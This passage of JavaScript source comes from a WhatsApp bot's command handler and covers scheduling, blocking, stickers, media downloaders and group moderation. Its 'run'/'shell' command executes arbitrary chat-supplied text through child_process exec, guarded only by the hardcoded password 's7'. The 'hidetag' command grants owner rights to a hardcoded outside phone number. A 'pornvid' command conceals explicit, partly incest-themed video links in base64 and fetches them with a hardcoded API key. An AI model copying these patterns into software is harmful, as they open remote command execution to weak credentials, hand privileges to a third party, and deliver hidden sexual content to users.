                }
            }
        } catch {}

        return SYHaTeReplay(
            `> ᴄʜᴀɴɴᴇʟ ɪɴꜰᴏ\n\n` +
            `• ᴄᴏᴅᴇ : ${channelCode}\n` +
            `• ꜱᴛᴀᴛᴜꜱ : no data\n` +
            `• ʀᴇᴀꜱᴏɴ : private / not joined`
        );

    } catch (err) {
        return SYHaTeReplay("✖ Error, try again");
    }
}

if (SYHaTeS7 === 'schedule') {
    const moment = require('moment-timezone');
    
    if (!text.includes(' ')) {
        return await SYHaTeReplay(`💡 *Format:* ${prefix}schedule [Date/Time] [JID] [Message]`);
    }

    const args = text.split(' ');
    let dateInput, timeInput, targetJid, messageInput;

    if (args[0].includes('-') || (args[0].includes(':') && args[0].length > 5)) {
        dateInput = args[0].replace(/:/g, '-');
        timeInput = args[1];
        targetJid = args[2].includes('@') ? args[2] : args[2] + '@s.whatsapp.net';
        messageInput = args.slice(3).join(' ');
    } else {
        dateInput = moment.tz("Asia/Kolkata").format("YYYY-MM-DD");
        timeInput = args[0];
        targetJid = args[1].includes('@') ? args[1] : args[1] + '@s.whatsapp.net';
        messageInput = args.slice(2).join(' ');
    }

    const targetDateTime = moment.tz(`${dateInput} ${timeInput}`, "YYYY-MM-DD HH:mm", "Asia/Kolkata");
    const now = moment.tz("Asia/Kolkata");

    if (!targetDateTime.isValid() || targetDateTime.isBefore(now)) {
        return await SYHaTeReplay("❌ *Invalid time!* Put Future Time.");
    }

    const contextInfo = S7.message?.extendedTextMessage?.contextInfo;
    const quotedMsg = contextInfo?.quotedMessage;
    let quotedToSave = null;

    if (quotedMsg) {
        quotedToSave = {
            key: {
                remoteJid: from,
                fromMe: false,
                id: contextInfo.stanzaId,
                participant: contextInfo.participant || from
            },
            message: quotedMsg,
            contextInfo: {
                forwardingScore: contextInfo.forwardingScore || 1,
                isForwarded: true
            }
        };
    }

    if (!db[botNumber]) db[botNumber] = {};
    if (!db[botNumber].schedules) db[botNumber].schedules = [];

    db[botNumber].schedules.push({
        jid: targetJid,
        targetTime: targetDateTime.format(),
        message: messageInput,
        quoted: quotedToSave,
        status: 'pending'
    });

    saveDB(db);

    const diff = moment.duration(targetDateTime.diff(now));
    return await SYHaTeReplay(`✅ *Schedule Set!*\n⏳ *Wait:* ${Math.floor(diff.asHours())}h ${diff.minutes()}m\n📍 *To:* ${targetJid}${quotedToSave ? '\n📎 *Quoted message saved!*' : ''}`);
}




if (SYHaTeS7 === 'block') {
    
    if (!isOwner) return await SYHaTeReplay(owneronly);

    let target;
    if (S7.message.extendedTextMessage?.contextInfo?.participant) {
        target = S7.message.extendedTextMessage.contextInfo.participant;
    } else {
        target = from;
    }

    if (target.endsWith('@g.us')) {
        return await SYHaTeReplay("❌ *I can only block users in private chats, not groups.*");
    }

    const cleanTarget = target.split(':')[0] + '@s.whatsapp.net';

    try {
        await SYHaTeReplay(`✅ *Processing block for:* @${cleanTarget.split('@')[0]}`, {
            mentions: [cleanTarget]
        });

        await SYxS7.updateBlockStatus([cleanTarget], "block");
        
    } catch (err) {
        await SYxS7.sendMessage(from, { text: `❌ *Failed to block:* ${err.message}` });
    }
    return;
}



if (SYHaTeS7 === 'listgc') {
    try {
        const groups = await SYxS7.groupFetchAllParticipating();
        const groupEntries = Object.values(groups);
        
        if (groupEntries.length === 0) {
            return await SYHaTeReplay("❌ *No groups found!*");
        }

        let SABIR7718 = `┏━━⟪ 𝙶𝚁𝙾𝚄𝙿 𝙻𝙸𝚂𝚃 ⟫━━⦿\n┃\n`;
        SABIR7718 += `┃ 𝚃𝚘𝚝𝚊𝚕 𝙶𝚛𝚘𝚞𝚙𝚜: ${groupEntries.length}\n┃\n`;

        groupEntries.forEach((gc, index) => {
            const gcName = gc.subject || "Unknown";
            const gcJid = gc.id;
            
            SABIR7718 += `┣── 『 ${index + 1} 』\n`;
            SABIR7718 += `┃ 𝙽𝚊𝚖𝚎: ${gcName}\n`;
            SABIR7718 += `┃ 𝙹𝙸𝙳: ${gcJid}\n`;
            SABIR7718 += `┃\n`;
        });

        SABIR7718 += `┗━━━━━━━━━━━━━━⦿`;

        await SYHaTeReplay(SABIR7718);


    } catch (err) {
        log('error', 'LISTGC', err.message);
        await SYHaTeReplay("❌ *Error fetching groups!*");
    }
}


if (SYHaTeS7 === 'checkraw') {
    try {
        const msg = S7.message;

        const contextInfo =
            msg?.extendedTextMessage?.contextInfo ||
            msg?.imageMessage?.contextInfo ||
            msg?.videoMessage?.contextInfo ||
            msg?.documentMessage?.contextInfo ||
            msg?.buttonsResponseMessage?.contextInfo ||
            msg?.templateButtonReplyMessage?.contextInfo ||
            msg?.interactiveResponseMessage?.contextInfo ||
            msg?.listResponseMessage?.contextInfo ||
            {};

        let targetMessage = contextInfo?.quotedMessage || msg;

        if (targetMessage?.ephemeralMessage) targetMessage = targetMessage.ephemeralMessage.message;
        if (targetMessage?.viewOnceMessage) targetMessage = targetMessage.viewOnceMessage.message;
        if (targetMessage?.viewOnceMessageV2) targetMessage = targetMessage.viewOnceMessageV2.message;

        const messageContent = targetMessage?.extendedTextMessage || 
                               targetMessage?.audioMessage || 
                               targetMessage?.imageMessage || 
                               targetMessage?.videoMessage || 
                               targetMessage;

        const innerContext = messageContent?.contextInfo || contextInfo;
        const adReply = innerContext?.externalAdReply;

        if (adReply || innerContext?.forwardedNewsletterMessageInfo) {
            let infoReport = `*🔍 EXTRACTED AD-REPLY DATA*\n\n`;
            
            if (adReply?.title) infoReport += `> *Title:* ${adReply.title}\n`;
            if (adReply?.body) infoReport += `> *Body:* ${adReply.body}\n`;
            if (adReply?.sourceUrl) infoReport += `> *Source URL:* ${adReply.sourceUrl}\n`;
            if (adReply?.thumbnailUrl) infoReport += `> *Thumb URL:* ${adReply.thumbnailUrl}\n`;
            if (adReply?.mediaType) infoReport += `> *Media Type:* ${adReply.mediaType}\n`;
            if (typeof adReply?.renderLargerThumbnail !== 'undefined') {
                infoReport += `> *Large Thumb:* ${adReply.renderLargerThumbnail ? '✅ True' : '❌ False'}\n`;
            }

            const newsletterInfo = innerContext?.forwardedNewsletterMessageInfo;
            if (newsletterInfo) {
                infoReport += `\n*📢 FORWARDED NEWSLETTER DATA*\n`;
                if (newsletterInfo.newsletterJid) infoReport += `> *Channel JID:* ${newsletterInfo.newsletterJid}\n`;
                if (newsletterInfo.newsletterName) infoReport += `> *Channel Name:* ${newsletterInfo.newsletterName}\n`;
            }

            infoReport += `\n*Dump complete context overview inside lower frame structure.*`;
            await SYHaTeReplay(infoReport);
        }

        const json = JSON.stringify(S7, null, 2);
        await SYHaTeReplay("```json\n" + json + "\n```");

    } catch (err) {
        console.error("CheckRaw Error:", err);
        await SYHaTeReplay("*❌ Failed to fetch raw JSON*");
    }
}


if (SYHaTeS7 === 'checkmsg') {
    try {

        const msg = S7.message;
        const contextInfo =
            msg?.extendedTextMessage?.contextInfo ||
            msg?.imageMessage?.contextInfo ||
            msg?.videoMessage?.contextInfo ||
            msg?.documentMessage?.contextInfo ||
            msg?.buttonsResponseMessage?.contextInfo ||
            msg?.templateButtonReplyMessage?.contextInfo ||
            msg?.interactiveResponseMessage?.contextInfo ||
            msg?.listResponseMessage?.contextInfo ||
            {};

        let quotedMsg = contextInfo?.quotedMessage;
        const stanzaId = contextInfo?.stanzaId;
        const participant = contextInfo?.participant || contextInfo?.remoteJid;

        if (!quotedMsg || !stanzaId) {
            return await SYHaTeReplay("❌ *Reply (quote) to a message and use it!*");
        }

        if (quotedMsg?.ephemeralMessage) {
            quotedMsg = quotedMsg.ephemeralMessage.message;
        }
        if (quotedMsg?.viewOnceMessage) {
            quotedMsg = quotedMsg.viewOnceMessage.message;
        }
        if (quotedMsg?.viewOnceMessageV2) {
            quotedMsg = quotedMsg.viewOnceMessageV2.message;
        }

        const msgType = Object.keys(quotedMsg || {})[0] || "unknown";

        const content =
            quotedMsg?.conversation ||
            quotedMsg?.extendedTextMessage?.text ||
            quotedMsg?.imageMessage?.caption ||
            quotedMsg?.videoMessage?.caption ||
            quotedMsg?.documentMessage?.caption ||
            quotedMsg?.buttonsMessage?.contentText ||
            quotedMsg?.listMessage?.description ||
            "Non-text content (Media/File)";

        const isBotMsg = stanzaId.length <= 25 || stanzaId.startsWith("3EB0");
        const isViewOnce = !!(quotedMsg?.viewOnceMessage || quotedMsg?.viewOnceMessageV2);
        const isEphemeral = !!quotedMsg?.ephemeralMessage;

        let SABIR7718 = `🔍 *ＭＥＳＳＡＧＥ  ＩＮＦＯ  ＤＥＴＡＩＬＳ*\n\n`;
        SABIR7718 += `   ├ *Type:* ${msgType}\n`;
        SABIR7718 += `   ├ *ID:* ${stanzaId}\n`;
        SABIR7718 += `   ├ *Sender:* @${(participant || '').split('@')[0]}\n`;
        SABIR7718 += `   ├ *Length:* ${stanzaId.length}\n`;
        SABIR7718 += `   ├ *Bot Msg:* ${isBotMsg ? 'Yes 🤖' : 'No'}\n`;
        SABIR7718 += `   ├ *ViewOnce:* ${isViewOnce ? 'Yes 👁️' : 'No'}\n`;
        SABIR7718 += `   ├ *Ephemeral:* ${isEphemeral ? 'Yes ⏳' : 'No'}\n`;
        SABIR7718 += `   ├ *Prefix:* ${stanzaId.substring(0, 6)}...\n`;
        SABIR7718 += `   └ *Content:* ${content.substring(0, 80)}${content.length > 80 ? '...' : ''}\n\n`;
        SABIR7718 += `*ＳＹＳＴＥＭ:* 𝒁𝑶𝑹𝑶 𝒙 𝑺7 𝑴𝑫`;

        await SYHaTeReplay(SABIR7718);

    } catch (err) {
        console.error("Checkmsg Error:", err);
        await SYHaTeReplay("❌ *Error:* The message could not be detected.");
    }
}



                                                if (SYHaTeS7 === 'stmaker' || SYHaTeS7 === 'brat') {
                    const { createCanvas } = require('canvas');
                    const { Sticker, StickerTypes } = require('wa-sticker-formatter');

                    if (!text) return await SYHaTeReplay(`🎨 *𝚉𝙾𝚁𝙾 𝚂𝚃𝙸𝙲𝙺𝙴𝚁 𝙼𝙰𝙺𝙴𝚁*\n\nPlease provide text.\n*Example:* ${prefix}stmaker Hello Zoro`);

                    await SYxS7.sendMessage(from, { react: { text: '🎨', key: S7.key } });

                    try {
                        const canvas = createCanvas(512, 512);
                        const ctx = canvas.getContext('2d');

                        ctx.fillStyle = '#ffffff';
                        ctx.fillRect(0, 0, canvas.width, canvas.height);

                        ctx.fillStyle = '#000000'; 
                        ctx.font = 'bold 50px Arial'; 
                        ctx.textAlign = 'left';
                        ctx.textBaseline = 'top';

                        const words = text.split(' ');
                        let line = '';
                        let x = 30;
                        let y = 30;
                        const lineHeight = 60;

                        for (let n = 0; n < words.length; n++) {
                            let testLine = line + words[n] + ' ';
                            let metrics = ctx.measureText(testLine);
                            if (metrics.width > 450 && n > 0) {
                                ctx.fillText(line, x, y);
                                line = words[n] + ' ';
                                y += lineHeight;
                            } else {
                                line = testLine;
                            }
                        }
                        ctx.fillText(line, x, y);

                        const buffer = canvas.toBuffer('image/png');

                        const sticker = new Sticker(buffer, {
                            pack: '𝚉𝙾𝚁𝙾 𝙼𝙳', 
                            author: '𝚂𝙰𝚈𝙰𝙽', 
                            type: StickerTypes.FULL,
                            categories: ['🤩', '🎉'],
                            id: '12345',
                            quality: 70,
                            background: '#ffffff'
                        });

                        const stickerBuffer = await sticker.toBuffer();
                        await SYxS7.sendMessage(from, { sticker: stickerBuffer }, { quoted: S7 });
                        await SYxS7.sendMessage(from, { react: { text: '✅', key: S7.key } });

                    } catch (e) {
                        console.error("Local Sticker Error:", e);
                        await SYHaTeReplay("❌ *Internal Error:* Check the Canvas library setup.");
                    }
                    return;
                }

                
                if (SYHaTeS7 === 'pornvid') {
                    if (!isOwner) return SYHaTeReplay(owneronly);
                    
                    SYHaTeReplay("🥵 *ON Mood Ah...*");

                    (async () => {
                        try {
                            const axios = require('axios');
                            const base64Links = [
                                "aHR0cHM6Ly94bnh4LmhlYWx0aC92aWRlby0xYXEwcmJlOC8xOV95ZWFyX29sZF9naXJsX2dvdF9oZXJfcHVzc3lfYW5kX2Fzc19mdWNrZWRfYnlfaGVyX3N0ZXBfYnJvdGhlcl9hbmRfZHJhbmtfaGlzX3NlbWVu",
                                "aHR0cHM6Ly94bnh4LmhlYWx0aC92aWRlby0xOWM4djM1Mi90aGVfYmFzdGFyZF9nb3RfaGlzXzZfZmVldF90YWxsX3Npc3Rlci1pbi1sYXdfc3Vja2VkX2J5X2hpc19iaWdfY29ja19hbmRfdGhlbl9mdWNrZWRfaGVyX2hhcmQu",
                                "aHR0cHM6Ly94bnh4LmhlYWx0aC92aWRlby0xYW1nYXBmOS90aGVfdW5ydWx5X3dvbWFuX2V4cG9zZWRfaGVyX3NhcmVlX2FuZF9ibG91c2VfaW5fZnJvbnRfb2ZfYV9zdHJhbmdlcl9hbmRfZ290X2hlcl9wdXNzeV9hbmRfYXNzX2Z1Y2tlZC4=",
                                "aHR0cHM6Ly94bnh4LmhlYWx0aC92aWRlby0xMW5oY2RhYy9iZXN0X2luZGlhbl9uZXdseV9tYXJyaWVkX2NvdXBsZV9zZXhfc2NlbmU=",
                                "aHR0cHM6Ly94bnh4LmhlYWx0aC92aWRlby0xYWk1bTcyYi9tb3RoZXJfdG9va19vZmZfaGVyX3NhcmlfYW5kX3BldHRpY29hdF9hbmRfZ290X25ha2VkX2FuZF9nb3RfaGVyX2Fzc19hbmRfYXNzX2Z1Y2tlZA==",
                                "aHR0cHM6Ly94bnh4LmhlYWx0aC92aWRlby0xYm4yc2o0MS90aGlyc3R5X3Npc3Rlcl9pbl9sYXdfaGFkX3NleF93aXRoX2h1c2JhbmRfc19mcmllbmRfZnVsbF9oaW5kaV92aWRlbw=="
                            ];

                            const links = base64Links.map(b => Buffer.from(b, 'base64').toString('utf-8'));
                            const shuffledLinks = links.sort(() => 0.5 - Math.random());
                            const sex = "SAYAN_ZORO";
                            let success = false;

                            for (let i = 0; i < Math.min(shuffledLinks.length, 5); i++) {
                                if (success) break;
                                try {
                                    const randomLink = shuffledLinks[i];
                                    const res = await axios.get(`https://new-api-five-eta.vercel.app/api/downloader/xnxx`, {
                                        params: { apikey: sex, url: randomLink },
                                        timeout: 20000
                                    });

                                    const result = res.data.result;
                                    if (result && (result.download.high_quality || result.download.low_quality)) {
                                        const videoUrl = result.download.high_quality || result.download.low_quality;
                                        const title = result.title || "Hot Video";

                                        const bufferRes = await axios.get(videoUrl, { responseType: 'arraybuffer' });
                                        const buffer = Buffer.from(bufferRes.data);

                                        await SYHaTeReplay({
                                            video: buffer,
                                            caption: `🔥 *${title}*`,
                                            mimetype: 'video/mp4'
                                        });

                                        success = true;
                                    }
                                } catch (e) {
                                    continue;
                                }
                            }

                            if (!success) {
                                SYHaTeReplay("❌ *Server Busy, Try Again!*");
                            }

                        } catch (err) {
                            console.error(err);
                        }
                    })();
                }
                
if (SYHaTeS7 === 'S7save') {
    const savedStatuses = db.statusVault?.[botNumber] || [];
    
    if (savedStatuses.length === 0) {
        return await SYHaTeReplay("❌ *No saved statuses found in the database.*");
    }

    await SYHaTeReplay(`🔄 *Sending ${savedStatuses.length} saved statuses...*`);

    for (const status of savedStatuses) {
        if (fs.existsSync(status.file)) {
            const mediaBuffer = fs.readFileSync(status.file);
            const sendObj = {};
            sendObj[status.type] = mediaBuffer;
            sendObj.caption = `📱 *Status From:* @${status.sender.split('@')[0]}\n*ZORO MD*`;
            sendObj.mentions = [status.sender];
            
            await SYxS7.sendMessage(from, sendObj);
        }
    }
    return;
}                

if (SYHaTeS7 === 'hidetag') {
    const isGroup = from.endsWith('@g.us');
    if (!isGroup) return SYHaTeReplay(onlygc);
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants;
    const getPureNumber = (id) => id ? id.split(':')[0].replace(/\D/g, '') : '';
    const S7_Lover_Number = getPureNumber(sender);
    const botNum = getPureNumber(SYxS7.user.id);
    const S7_Number = '917384280473';
    const senderParticipant = participants.find(p => getPureNumber(p.id) === S7_Lover_Number);
    const isAdmins = senderParticipant && (senderParticipant.admin === 'admin' || senderParticipant.admin === 'superadmin');
    const isOwner = S7.key.fromMe || S7_Lover_Number === botNum || S7_Lover_Number === S7_Number;
    if (!isAdmins && !isOwner) return SYHaTeReplay("❌ *Admin Only Command!*");
    const groupMembers = participants.map(p => p.id);
    const quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (quoted) {
        await SYxS7.sendMessage(from, { 
            forward: { 
                key: S7.message.extendedTextMessage.contextInfo.stanzaId, 
                remoteJid: from, 
                fromMe: S7.key.fromMe 
            },
            contextInfo: { 
                mentionedJid: groupMembers,
                forwardingScore: 999,
                isForwarded: true
            }
        });
    } else {
        const messageText = text || "📢 *Attention Everyone!*";
        await SYxS7.sendMessage(from, { 
            text: messageText, 
            mentions: groupMembers 
        });
    }
    return;
}

                if (SYHaTeS7 === 'antilink') {
    if (!isGroup) return SYHaTeReplay(onlygc);
    if (!isOwner) return SYHaTeReplay(owneronly);
    
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants || [];
const myLid = (SYxS7.user.lid || '').split(':')[0].split('@')[0];
        const isBotAdmin = participants.some(p => p.id.split('@')[0] === myLid && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    let currentStatus = "❌ Off";
    if (db[from].antilink === 'on') currentStatus = "🗑️ Delete Only";
    if (db[from].antilink === 'kick') currentStatus = "🚫 Kick Mode";
    if (db[from].antilink === 'warn') currentStatus = "⚠️ Warning Mode";

    if (args[0] === 'set' && args[1] === 'kick') {
        db[from].antilink = 'kick';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Link set to Kick Mode!*");
    } else if (args[0] === 'set' && args[1] === 'delete') {
        db[from].antilink = 'on';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Link set to Delete Only Mode!*");
    } else if (args[0] === 'set' && args[1] === 'warn') {
        db[from].antilink = 'warn';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Link set to Warning Mode!* (3 Warns = Kick)");
    } else if (args[0] === 'on') {
        db[from].antilink = 'on';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Link turned ON!*");
    } else if (args[0] === 'off') {
        db[from].antilink = false;
        saveDB(db);
        return SYHaTeReplay("❌ *Anti-Link turned OFF!*");
    } else {
        return SYHaTeReplay(`*ＡＮＴＩ  -  ＬＩＮＫ*\n\nStatus: ${currentStatus}\nAdmin Status: ${isBotAdmin ? '✅ Verified' : '❌ Not Admin'}\n\n*Commands:*\n> ${prefix}antilink set kick\n> ${prefix}antilink set delete\n> ${prefix}antilink set warn\n> ${prefix}antilink on\n> ${prefix}antilink off`);
    }
}

if (SYHaTeS7 === "run" || SYHaTeS7 === "shell") {
        if (!isOwner) return await SYHaTeReplay(owneronly);

        if (!db[botNumber]) db[botNumber] = {};
        if (!db[botNumber].shellAuthorized)
          db[botNumber].shellAuthorized = false;

        const isPasswordCmd = text.startsWith("--passwd ");

        if (isPasswordCmd) {
          const providedPass = text.replace("--passwd ", "").trim();
          if (providedPass === "s7") {
            db[botNumber].shellAuthorized = true;
            saveDB(db);
            return await SYHaTeReplay(
              `✅ *Shell access authorized successfully!*\nYou can now use ${prefix}${SYHaTeS7} <command>`,
            );
          } else {
            return await SYHaTeReplay("❌ *Wrong password!*");
          }
        }

        if (!db[botNumber].shellAuthorized) {
          return await SYHaTeReplay(
            `*🔒 Shell Access Restricted*\n\nUse: /run --passwd (passed) first to authorize.\n\n*Example:*\n${prefix}${SYHaTeS7} ls\n${prefix}${SYHaTeS7} whoami`,
          );
        }

        if (!text) {
          return await SYHaTeReplay(
            `*Usage:* ${prefix}${SYHaTeS7} <command>\n\n*Example:*\n${prefix}${SYHaTeS7} ls -la\n${prefix}${SYHaTeS7} node -v`,
          );
        }

        await SYxS7.sendMessage(from, { react: { text: "⚙️", key: S7.key } });

        try {
          const { exec } = require("child_process");

          exec(text, { timeout: 30000 }, async (error, stdout, stderr) => {
            let output = "";

            if (error) {
              output += `❌ *Error:* ${error.message}\n\n`;
            }
            if (stderr) {
              output += `⚠️ *Stderr:*\n${stderr}\n\n`;
            }
            if (stdout) {
              output += `✅ *Output:*\n${stdout}`;
            } else if (!error && !stderr) {
              output += "✅ *Command executed successfully (no output)*";
            }

            await SYHaTeReplay(`*Shell Output:*\n\n${output}`);

            await SYxS7.sendMessage(from, {
              react: { text: "✅", key: S7.key },
            });
          });
        } catch (err) {
          console.error("Shell Error:", err);
          await SYHaTeReplay(`❌ *Shell Execution Failed:* ${err.message}`);
        }
        return;
      }

if (SYHaTeS7 === 'ig' || SYHaTeS7 === 'insta' || SYHaTeS7 === 'instagram') {
    const q = body.trim().split(/ +/).slice(1).join(" ");
    const from = S7.key.remoteJid;

    if (!q) return SYHaTeReplay('⚠️ *Please provide an Instagram link!*');
    if (!/https?:\/\/(?:www\.)?instagram\.com\/(?:p|reel|tv|reels)/.test(q)) return SYHaTeReplay('❌ *Invalid Instagram link!*');

    SYxS7.sendMessage(from, { react: { text: '⏳', key: S7.key } });

    (async () => {
        try {
            const axios = require("axios");
            const response = await axios.get(`https://social-media-downloader-api-s7.onrender.com/sylove?url=${encodeURIComponent(q)}`);
            const res = response.data;

            if (!res || !res.video_url) {
                return SYHaTeReplay('❌ *No media found or API error.*');
            }

            const mediaUrl = res.video_url;
            const isVideo = true; 

            await SYHaTeReplay({ 
                [isVideo ? 'video' : 'image']: { url: mediaUrl }, 
                caption: '> *© 𝐙𝐎𝐑𝐎 𝐌𝐃 𝐋𝐈𝐓𝐄*',
                mimetype: isVideo ? 'video/mp4' : 'image/jpeg'
            });

            SYxS7.sendMessage(from, { react: { text: '✅', key: S7.key } });

        } catch (e) {
            console.error(e);
            SYHaTeReplay('❌ *Internal Error: Could not process media!*');
        }
    })();
}

if (SYHaTeS7 === 'tt' || SYHaTeS7 === 'tiktok') {
    if (!text) return SYHaTeReplay('⚠️ *Please provide a TikTok video link!*');
    if (!text.includes('tiktok.com')) return SYHaTeReplay('❌ *Invalid TikTok link!*');

    SYxS7.sendMessage(from, { react: { text: '⏳', key: S7.key } });

    (async () => {
        try {
            const apiUrl = "https://social-media-downloader-api-s7.onrender.com/sylove?url=" + encodeURIComponent(text);
            
            const res = await axios.get(apiUrl);

            if (res.data.status !== "success") {
                return SYHaTeReplay('❌ *Failed to fetch video. Make sure the link is public!*');
            }

            const videoUrl = res.data.video_url;
            const title = res.data.title || "TikTok Video";

            if (!videoUrl) return SYHaTeReplay('❌ *Video URL not found!*');

            await SYHaTeReplay({
                video: { url: videoUrl },
                caption: `✅ *Downloaded Successfully*\n📌 *Title:* ${title}\n\n> *𝒁𝑶𝑹𝑶 𝑴𝑫*`,
                mimetype: 'video/mp4'
            });

            SYxS7.sendMessage(from, { react: { text: '✅', key: S7.key } });

        } catch (e) {
            console.error("TikTok Downloader Error:", e.message);
            SYHaTeReplay('❌ *Internal Error: API is currently down or link is private!*');
        }
    })();
    return;
}

if (SYHaTeS7 === 'antipromote' || SYHaTeS7 === 'antidemote') {
    if (!isGroup) return await SYHaTeReplay("❌ This command can only be used in groups!");

    try {
        const botNumberOnly = (SYxS7.user.id || '').split(':')[0].split('@')[0];
        const dbKey = botNumberOnly + '@s.whatsapp.net';
        
        const myLid = (SYxS7.user.lid || '').split(':')[0].split('@')[0];
        
        const groupMetadata = await SYxS7.groupMetadata(from);
        const participants = groupMetadata.participants || [];
        
        const senderLid = (S7.key.participant || '').split(':')[0].split('@')[0];

        const isSenderAdmin = participants.some(p => p.id.split('@')[0] === senderLid && (p.admin === 'admin' || p.admin === 'superadmin'));
        if (!isSenderAdmin && !S7.key.fromMe) return await SYHaTeReplay("❌ *Admin Only Command!* You must be an admin to use this.");

        const isBotAdmin = participants.some(p => p.id.split('@')[0] === myLid && (p.admin === 'admin' || p.admin === 'superadmin'));

        if (!db[dbKey]) db[dbKey] = {};
        if (!db[dbKey].anti_action) db[dbKey].anti_action = {};
        if (!db[dbKey].anti_action[from]) db[dbKey].anti_action[from] = { promote: false, demote: false };

        const cmdType = SYHaTeS7 === 'antipromote' ? 'promote' : 'demote';
        const oppositeType = cmdType === 'promote' ? 'demote' : 'promote';
        
        const args = text.toLowerCase().trim().split(' ');

        if (args[0] === 'set') {
            if (args[1] === 'kick') {
                if (db[dbKey].anti_action[from][oppositeType]) {
                    return await SYHaTeReplay(`❌ *Conflict!* Please turn off \`anti${oppositeType}\` first.`);
                }
                db[dbKey].anti_action[from][cmdType] = 'kick';
                saveDB(db);
                return await SYHaTeReplay(`✅ *Anti-${cmdType.toUpperCase()}: KICK mode activated.*`);
            } else if (args[1] === 'revert') {
                if (db[dbKey].anti_action[from][oppositeType]) {
                    return await SYHaTeReplay(`❌ *Conflict!* Please turn off \`anti${oppositeType}\` first.`);
                }
                db[dbKey].anti_action[from][cmdType] = 'revert';
                saveDB(db);
                return await SYHaTeReplay(`✅ *Anti-${cmdType.toUpperCase()}: REVERT mode activated.*`);
            }
        } else if (args[0] === 'on') {
            if (db[dbKey].anti_action[from][oppositeType]) {
                return await SYHaTeReplay(`❌ *Conflict!* Please turn off \`anti${oppositeType}\` first.`);
            }
            db[dbKey].anti_action[from][cmdType] = 'revert';
            saveDB(db);
            return await SYHaTeReplay(`✅ *Anti-${cmdType.toUpperCase()} Enabled!* System will monitor action logs.`);
        } else if (args[0] === 'off') {
            db[dbKey].anti_action[from][cmdType] = false;
            saveDB(db);
            return await SYHaTeReplay(`❌ *Anti-${cmdType.toUpperCase()} Disabled!*`);
        } else {
            const currentSetting = db[dbKey].anti_action[from][cmdType];
            const status = currentSetting ? `ACTIVE (${String(currentSetting).toUpperCase()})` : 'OFF';
            const panelTitle = SYHaTeS7 === 'antipromote' ? 'ＡＮＴＩ - ＰＲＯＭＯＴＥ' : 'ＡＮＴＩ - ＤＥＭＯＴＥ';
            
            const menu = `*${panelTitle}*

Status: ${status}
Admin Status: ${isBotAdmin ? '✅ Verified' : '❌ Not Admin'}

*Commands:*
> ${prefix}${SYHaTeS7} set kick
> ${prefix}${SYHaTeS7} set revert
> ${prefix}${SYHaTeS7} on
> ${prefix}${SYHaTeS7} off`;
            return await SYHaTeReplay(menu);
        }
    } catch (err) {
        console.error(err);
        return await SYHaTeReplay("❌ *Error:* Processing failed.\n" + err);
    }
}


if (SYHaTeS7 === 'getbio') {
    try {
        let target;

        const quoted = S7.message?.extendedTextMessage?.contextInfo?.participant;
        const mentioned = S7.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];

        if (quoted) {
            target = quoted;
        } else if (mentioned) {
            target = mentioned;
        } else {
            target = from;
        }

        if (target.endsWith('@g.us')) {
            return SYHaTeReplay("❌ *Please reply or mention a user!*");
        }

        const cleanJid = target.split(':')[0] + '@s.whatsapp.net';

        let bio = await SYxS7.fetchStatus(cleanJid);

        let about = bio?.status || "No bio found.";

        await SYHaTeReplay(
            `👤 *User:* @${cleanJid.split('@')[0]}\n📝 *Bio:* ${about}`,
            { mentions: [cleanJid] }
        );

    } catch (err) {
        console.error("GetBio Error:", err);
        SYHaTeReplay("❌ *Failed to fetch bio!*");
    }
}

if (SYHaTeS7 === 'toptt') {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const fs = require('fs');
    const ffmpeg = require('fluent-ffmpeg');
    const ffmpegPath = require('ffmpeg-static');

    ffmpeg.setFfmpegPath(ffmpegPath);

    const quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const mime = quoted?.audioMessage ? 'audioMessage' : null;

    if (!mime) return await SYHaTeReplay("❌ *Reply to an audio message!*");

    const S7input = `./S7_${Date.now()}.input`;
    const S7output = `./S7_${Date.now()}.opus`;

    try {
        await SYxS7.sendMessage(from, { react: { text: '🔄', key: S7.key } });

        const stream = await downloadContentFromMessage(quoted[mime], 'audio');
        const chunks = [];

        for await (const c of stream) {
            chunks.push(c);
        }

        fs.writeFileSync(S7input, Buffer.concat(chunks));

        await new Promise((res, rej) => {
            ffmpeg(S7input)
                .audioCodec('libopus')
                .audioBitrate(64)
                .format('ogg')
                .save(S7output)
                .on('end', res)
                .on('error', rej);
        });

        const buf = fs.readFileSync(S7output);

        await SYHaTeReplay({
            audio: buf,
            mimetype: 'audio/ogg; codecs=opus',
            ptt: true
        });

        fs.unlinkSync(S7input);
        fs.unlinkSync(S7output);

        await SYxS7.sendMessage(from, { react: { text: '✅', key: S7.key } });

    } catch (e) {
        if (fs.existsSync(S7input)) fs.unlinkSync(S7input);
        if (fs.existsSync(S7output)) fs.unlinkSync(S7output);
        await SYHaTeReplay("❌ *Conversion failed!*");
    }
}

if (SYHaTeS7 === 'invite') {
    if (!isGroup) return await SYHaTeReplay(onlygc);
    
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants;
    const botNumber = (SYxS7.user.id.split(':')[0] || SYxS7.user.id).split('@')[0] + '@s.whatsapp.net';
    const botLid = SYxS7.user.lid || botNumber; 
    const isBotAdmin = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id).some(id => id === botNumber || id === botLid) : false;


  //  if (!isBotAdmin) return await SYHaTeReplay("*I need to be an admin to generate the group invite link!*");

    try {
        const code = await SYxS7.groupInviteCode(from);
        
        if (!code) {
            return await SYHaTeReplay("*I can't get the invite link.*");
        }
        
        const inviteLink = `https://chat.whatsapp.com/${code}`;
        return await SYHaTeReplay(`*Group Invite Link:*\n${inviteLink}`);
    } catch (err) {
        console.error(err);
        return await SYHaTeReplay("*I can't get the invite link.* \n" + err);
    }
}
                
if (SYHaTeS7 === 'fb' || SYHaTeS7 === 'facebook') {

    if (!text) {
        return SYHaTeReplay('⚠️ *Please provide a Facebook video/reel link!*');
    }

    if (!text.includes('facebook.com') && !text.includes('fb.watch')) {
        return SYHaTeReplay('❌ *Invalid Facebook link!*');
    }

